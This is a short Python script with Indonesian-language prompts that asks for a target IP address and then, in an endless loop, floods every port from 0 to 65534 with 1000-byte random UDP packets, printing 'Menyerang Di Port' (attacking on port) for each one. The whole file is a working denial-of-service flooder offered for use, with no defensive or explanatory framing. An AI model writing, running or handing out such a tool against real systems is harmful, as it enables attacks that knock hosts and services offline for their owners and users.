import socket
import random
import string

target_ip = input("Masukan Alamat IP Target: ")

while True:
    for port in range(0,65535):
        letters = string.ascii_lowercase
        result_str = ''.join(random.choice(letters) for i in range(1000))
        byte_message = bytes(result_str, "utf-8")
        opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            opened_socket.sendto(byte_message, (target_ip, port))
            print("Menyerang Di Port :",port)
        except OSError as identifier:
            opened_socket.close()
            pass